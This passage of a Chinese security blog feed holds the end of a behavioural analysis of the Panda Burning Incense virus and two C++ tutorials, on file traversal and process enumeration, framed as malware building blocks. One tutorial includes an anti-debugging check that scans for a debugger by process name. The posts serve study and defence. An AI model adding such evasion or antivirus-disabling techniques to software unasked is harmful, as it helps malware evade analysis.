src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/62.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/63.png"></p><p>并且还有一个执行的操作，猜测应该是从网页中获取到的程序来运行。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/64.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/65.png"></p><h4 id="定时3，sub-40CE94函数"><a href="#定时3，sub-40CE94函数" class="headerlink" title="定时3，sub_40CE94函数"></a>定时3，sub_40CE94函数</h4><p>每十秒执行一次。</p><p>进来后先创建了两个线程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/66.png"></p><p>第一个线程最终会创建40C964，这个之前已经分析过了</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/67.png"></p><p>第二个线程40CC38，它是删除了所有的共享文件夹。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/68.png"></p><h4 id="定时4，sub-407540函数"><a href="#定时4，sub-407540函数" class="headerlink" title="定时4，sub_407540函数"></a>定时4，sub_407540函数</h4><p>它每隔6s执行一次，创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/69.png"></p><p>这里主要是关闭并删除了一些服务和将一些杀软的启动项删除，</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/70.png"></p><p>关闭服务</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/71.png"></p><p>删除服务</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/72.png"></p><p>删除启动项</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/73.png"></p><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>这里主要是四个功能</p><ol><li>第一个是每秒执行关闭杀软和一些其他进程，设置自启动键值和不显示隐藏文件。</li><li>第二个每隔20分钟执行一次，会尝试下载资源并运行。</li><li>第三个每隔十秒执行一次，删除所有的共享文件夹。</li><li>每六秒执行一次，关闭删除服务，并且删除杀软的启动项。</li></ol><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>到这里整个熊猫烧香就分析完毕了，使用OD结合IDA也分析了比较长的时间，这也算是第一篇正式的一个病毒分析报告，写的可能还是有不成熟的地方，后续还要慢慢改进。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;熊猫烧香做为非常经典的病毒之一，可以说已经被分析烂了，网上也有许许多多的分析流程。作为病毒分析的一个初学者，我现在也尝试分析一下熊猫烧香，争</summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ackie.cn/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ackie.cn/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    <category term="熊猫烧香" scheme="https://b1ackie.cn/tags/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/"/>
    
  </entry>
  
  <entry>
    <title>功能技术-文件遍历</title>
    <link href="https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/"/>
    <id>https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/</id>
    <published>2021-08-17T09:58:04.000Z</published>
    <updated>2021-08-18T03:36:45.447Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h2><p>文件搜索功能是应用程序中最常见的功能之一，同时对于恶意代码来说也是常见的功能，比如勒索病毒就会有大量的文件操作，遍历文件来对文件进行加密。</p><p>实现文件遍历的方法有很多，最常见的便是通过API实现，这里主要涉及的是FindFirstFile,FindNextFile以及FindClose等。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="FindFirstFile"><a href="#FindFirstFile" class="headerlink" title="FindFirstFile"></a>FindFirstFile</h3><p>在目录中搜索名称与特定名称匹配的文件或者子目录。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">HANDLE <span class="hljs-title">FindFirstFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR             lpFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPWIN32_FIND_DATAA lpFindFileData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>lpFileName：指定目录、路径、以及文件名。文件名可以包括通配符，例如“*”，“？”。此参数不应该为NULL，无效的字符串（例如，空字符串或缺少终止空字符的字符串），尾部以反斜杠（\）结尾。</p><p>如果字符串以通配符、句点“.”或者目录名称结尾，那么用户必须对路径上的根目录和所有子目录具有访问权限。</p><p>lpFindFileData：指向WIN32_FIND_DATA结构的指针，用于接收搜索到的文件或者目录的信息。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值是在后续调用FindNextFile或者FindClose中使用的搜索句柄，lpFindFileData参数包含搜索到的第一个文件或者目录的信息。</p><p>如果函数失败或无法从lpFindFileData参数的搜索字符串中找到文件，则返回值为INVALID_HANDLE_VALUE，并且lpFindFileData的内容是不确定的。</p><h3 id="FindNextFile"><a href="#FindNextFile" class="headerlink" title="FindNextFile"></a>FindNextFile</h3><p>继续搜索文件</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">FindNextFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE             hFindFile,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPWIN32_FIND_DATAA lpFindFileData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p>hFindFile：指向前一次调用FindFirstFile或者FindFirstFileEx函数返回的搜索句柄。</p><p>lpFindFileData：指向WIN32_FIND_DATA结构的指针，该结构接收搜索到的文件或子目录的信息。</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值不为0，lpFindFileData参数包含搜索到的下一个文件或者目录的信息。如果函数失败，则返回值为0，并且lpFindFileData的内容是不确定的。</p><h3 id="WIN32-FIND-DATAA-结构"><a href="#WIN32-FIND-DATAA-结构" class="headerlink" title="WIN32_FIND_DATAA 结构"></a>WIN32_FIND_DATAA 结构</h3><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">typedef struct _WIN32_FIND_DATAA &#123;<br>  <span class="hljs-type">DWORD</span>    dwFileAttributes;<br>  <span class="hljs-type">FILETIME</span> ftCreationTime;<br>  <span class="hljs-type">FILETIME</span> ftLastAccessTime;<br>  <span class="hljs-type">FILETIME</span> ftLastWriteTime;<br>  <span class="hljs-type">DWORD</span>    nFileSizeHigh;<br>  <span class="hljs-type">DWORD</span>    nFileSizeLow;<br>  <span class="hljs-type">DWORD</span>    dwReserved0;<br>  <span class="hljs-type">DWORD</span>    dwReserved1;<br>  <span class="hljs-type">CHAR</span>     cFileName[<span class="hljs-type">MAX_PATH</span>];<br>  <span class="hljs-type">CHAR</span>     cAlternateFileName[14];<br>  <span class="hljs-type">DWORD</span>    dwFileType;<br>  <span class="hljs-type">DWORD</span>    dwCreatorType;<br>  <span class="hljs-type">WORD</span>     wFinderFlags;<br>&#125; <span class="hljs-type">WIN32_FIND_DATAA</span>, *<span class="hljs-type">PWIN32_FIND_DATAA</span>, *<span class="hljs-type">LPWIN32_FIND_DATAA</span>;<br></code></pre></div></td></tr></table></figure><h4 id="成员"><a href="#成员" class="headerlink" title="成员"></a>成员</h4><p>dwFileAttributes：指定文件的文件属性。</p><p>ftCreationTime：指定文件或者目录何时创建的FILETIME结构。如果底层文件系统不支持创建时间，则此成员为0。</p><p>ftLastAccessTime：对于文件，结构指定文件最后读取、写入或者运行可执行文件的时间。</p><p>ftLastWriteTime：对于文件，该结构指定文件上次写入、截断或者覆盖的时间。</p><p>nFileSizeHigh：指定文件大小的高阶DWORD值，以字节为单位。</p><p>nFileSizeLow：指定文件大小的低阶DWORD值，以字节为单位。</p><p>dwReserved0：若dwFileAttributes成员包含FILE_ATTRIBUTE_REPARSE_POINT属性，则此成员将指定重新标记解析点。若此值未定义，则不应该使用。</p><p>dwReserved1：保留</p><p>cFileName：指向文件的名称。</p><p>cAlternateFileName：指向该文件的替代名称。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>文件的搜索功能主要是通过FindFirstFile和FindNextFile这两个函数来实现的。</p><p>首先是搜索的路径，假设当前要搜索C盘下所有的文件，那么路径就是”C:\\“，指定搜索所有的文件就加上通配符”*“，现在的路径就是”C:\\*.*“。</p><p>然后就可以调用FindFirstFile函数，进行搜索，搜索的结果保存在WIN32_FIND_DATA结构体指针指向的内存中。结构体中包含文件的各项信息。可以根据成员dwFileAttributes判断文件的属性，若文件属性是FILE_ATTRIBUTE_DIRECTORY，则说明这是一个目录，可以进行再次搜索，但是要注意要过滤掉当前目录“.”和上级目录“..”，根据cFileName获取文件的名称。</p><p>之后再调用FindNextFile函数搜索下一个文件即可，重复上述操作，直到根据返回值判断，搜索不到文件。</p><p>最后调用FindClose关闭搜索句柄。</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><p>结果太多，为了结果更好展示，将其输出到TXT文件中。搜索时再加入一个判断，只输出exe类型文件。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">findFile</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszPath)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">findFile</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop&quot;</span>);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">findFile</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* pszPath)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwBufferSize = <span class="hljs-number">4096</span>;<br><span class="hljs-keyword">char</span>* pszFileName = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">char</span>* pszNextPath = <span class="hljs-literal">NULL</span>;<br>WIN32_FIND_DATA FileData = &#123; <span class="hljs-number">0</span> &#125;;<br>BOOL flag = FALSE;<br><span class="hljs-comment">//申请动态内存</span><br>pszFileName = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[dwBufferSize];<br>pszNextPath = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[dwBufferSize];<br><span class="hljs-comment">//搜索当前路径下的所有文件</span><br><span class="hljs-built_in">sprintf</span>(pszFileName, <span class="hljs-string">&quot;%s\\*.*&quot;</span>, pszPath);<br><span class="hljs-keyword">char</span> ext[_MAX_EXT];<br><span class="hljs-comment">//创建一个TXT文件，将结果输出</span><br>FILE* fp;<br>fp = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\1.txt&quot;</span>, <span class="hljs-string">&quot;a+&quot;</span>);<br>HANDLE hFile = <span class="hljs-built_in">FindFirstFile</span>(pszFileName, &amp;FileData);<br><span class="hljs-keyword">if</span> (hFile != INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-keyword">do</span><br>&#123;<br><span class="hljs-comment">//过滤掉当前目录和上级目录</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(FileData.cFileName,<span class="hljs-string">&quot;.&quot;</span>) || !<span class="hljs-built_in">strcmp</span>(FileData.cFileName, <span class="hljs-string">&quot;..&quot;</span>))<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-comment">//拼接文件路径</span><br><span class="hljs-built_in">sprintf</span>(pszNextPath, <span class="hljs-string">&quot;%s\\%s&quot;</span>, pszPath, FileData.cFileName);<br><span class="hljs-comment">//如果是一个目录的话，继续搜索</span><br><span class="hljs-keyword">if</span> (FileData.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)<br>&#123;<br><span class="hljs-built_in">findFile</span>(pszNextPath);<br>&#125;<br><span class="hljs-comment">//不是的话就输出文件名字</span><br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">//分割文件名字</span><br>_splitpath(pszNextPath, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, ext);<br><span class="hljs-comment">//判断是否是EXE文件</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strcmp</span>(ext, <span class="hljs-string">&quot;.exe&quot;</span>))<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, pszNextPath);<br><span class="hljs-comment">//写入文件</span><br><span class="hljs-built_in">fprintf</span>(fp, <span class="hljs-string">&quot;%s\r\n&quot;</span>, pszNextPath);<br>&#125;<br>&#125;<br><span class="hljs-comment">//继续搜索</span><br>&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">FindNextFile</span>(hFile, &amp;FileData));<br>&#125;<br><span class="hljs-built_in">fclose</span>(fp);<br><span class="hljs-built_in">FindClose</span>(hFile);<br><span class="hljs-keyword">delete</span> []pszNextPath;<br>pszNextPath = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">delete</span> []pszFileName;<br>pszFileName = <span class="hljs-literal">NULL</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行程序，选择遍历的目录为桌面，查看结果可以看到成功输出了当前桌面所有的exe文件（包含子文件夹中的）。</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/1.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;文件遍历&quot;&gt;&lt;a href=&quot;#文件遍历&quot; class=&quot;headerlink&quot; title=&quot;文件遍历&quot;&gt;&lt;/a&gt;文件遍历&lt;/h2&gt;&lt;p&gt;文件搜索功能是应用程序中最常见的功能之一，同时对于恶意代码来说也是常见的功能，比如勒索病毒就会有大量的文件操作，遍历文件来对</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="功能技术" scheme="https://b1ackie.cn/tags/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>功能技术-进程遍历</title>
    <link href="https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/"/>
    <id>https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/</id>
    <published>2021-08-17T08:55:11.000Z</published>
    <updated>2021-08-18T02:40:42.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="进程遍历"><a href="#进程遍历" class="headerlink" title="进程遍历"></a>进程遍历</h2><p>进程遍历就是遍历当前计算机上所有的进程信息，对于恶意代码来说，可以通过遍历获取进程的信息，可以通过这些信息来判断是否存在指定的进程，比如调试器、杀毒软件。遍历进程的方法有很多，最常用的就是通过进程快照来实现。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="CreateToolhelp32Snapshot"><a href="#CreateToolhelp32Snapshot" class="headerlink" title="CreateToolhelp32Snapshot"></a>CreateToolhelp32Snapshot</h3><p>获取指定进程的快照，以及这些进程使用的堆、模块和线程。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">HANDLE CreateToolhelp32Snapshot(<br>  <span class="hljs-built_in">DWORD</span> dwFlags,<br>  <span class="hljs-built_in">DWORD</span> th32ProcessID<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>dwFlags：指定快照中包含的系统内容，这个参数能够使用下列数值中的一个或者多个。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>THE32CS_INHERIT</td><td>声明快照句柄是可继承的</td></tr><tr><td>THE32CS_SNAPALL</td><td>在快照中包含系统中所有的进程和线程</td></tr><tr><td>THE32CS_SNAPHEAPLIST</td><td>在快照中包含在the32ProcessID中指定进程的所有堆</td></tr><tr><td>THE32CS_SNAPMODULE</td><td>在快照中包含在the32ProcessID中指定进程的所有模块</td></tr><tr><td>THE32CS_SNAPPROCESS</td><td>在快照中包含系统中所有的进程</td></tr><tr><td>THE32CS_SNAPTHREAD</td><td>在快照中包含系统中所有的线程</td></tr></tbody></table><p>th32ProcessID：指定将要快照的进程ID。如果该参数为0，则表示快照当前进程。该参数只有在设置了THE32CS_SNAPHEAPLIST或者THE32CS_SNAPMODULE后才有效，其他情况下应该忽略此参数，快照所有的进程。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>若调用成功，则返回快照的句柄；若调用失败，则返回INVALID_HANDLE_VALUE。</p><h3 id="Process32First"><a href="#Process32First" class="headerlink" title="Process32First"></a>Process32First</h3><p>检索系统快照中遇到的第一个进程信息</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">Process32First</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE           hSnapshot,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESSENTRY32 lppe</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p>hSnapshot：从上次调用CreateToolhelp32Snapshot函数返回的快照句柄。</p><p>lppe：指向PROCESSENTRY32结构的指针 。它包含进程信息，例如可执行文件的名称、进程标识符和父进程的进程标识符。</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>TRUE标识进程列表的第一个条目已经复制到缓冲区，FALSE表示失败。</p><h3 id="Process32Next"><a href="#Process32Next" class="headerlink" title="Process32Next"></a>Process32Next</h3><p>检索有关记录在系统快照中的下一个进程信息。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">Process32Next</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE           hSnapshot,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESSENTRY32 lppe</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><p>hSnapshot：处理从先前调用CreateToolhelp32Snapshot函数返回的快照句柄</p><p>lppe：指向PROCESSENTRY32结构的指针。</p><h4 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h4><p>如果进程列表的下一个条目已经复制到缓冲区，则返回TRUE；否则返回FALSE。如果不存在任何进程或者快照不包含进程信息，则GetLastError会显示ERROR_NO_MORE_FILES。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>调用CreateToolhelp32Snapshot可以获取当前的进程快照，如果成功便会得到一个进程信息列表，并且返回这个列表的起始索引。然后调用Process32First获取第一个进程信息，进程的信息都保存在PROCESSENTRY32结构体的缓冲区中。若要获取下一个进程信息，就可以调用Process32Next，循环即可获取所有的进程信息。直到Process32Next函数返回值是FALSE，且GetLastError错误代码为ERROR_NO_MORE_FILES，这就表示遍历已经结束了。</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>PROCESSENTRY32 pe = &#123; <span class="hljs-number">0</span> &#125;;<br>pe.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PROCESSENTRY32);<br><span class="hljs-comment">//进程快照</span><br>HANDLE hProcessSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//获取第一个进程信息</span><br>BOOL flag = <span class="hljs-built_in">Process32First</span>(hProcessSnap, &amp;pe);<br><span class="hljs-keyword">while</span> (flag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[PID:%d]\t&quot;</span>, pe.th32ParentProcessID);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%s]\n&quot;</span>, pe.szExeFile);<br><span class="hljs-comment">//获取下一个进程信息</span><br>flag = <span class="hljs-built_in">Process32Next</span>(hProcessSnap, &amp;pe);<br>&#125;<br><span class="hljs-built_in">CloseHandle</span>(hProcessSnap);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行查看效果，可以看到可以打印出当前的所有进程信息</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/1.png"></p><h2 id="反调试功能测试"><a href="#反调试功能测试" class="headerlink" title="反调试功能测试"></a>反调试功能测试</h2><p>可以通过遍历所有进程来查找是否存在一个调试器，只需要比较一下进程名即可</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">lstrcmp</span>(pe.szExeFile, <span class="hljs-string">&quot;吾爱破解[LCG].exe&quot;</span>))<br>&#123;<br><span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;发现调试器&quot;</span>, <span class="hljs-string">&quot;！！！&quot;</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>打开OD，可以看到就会弹窗提示存在调试器。</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/2.png"></p><h2 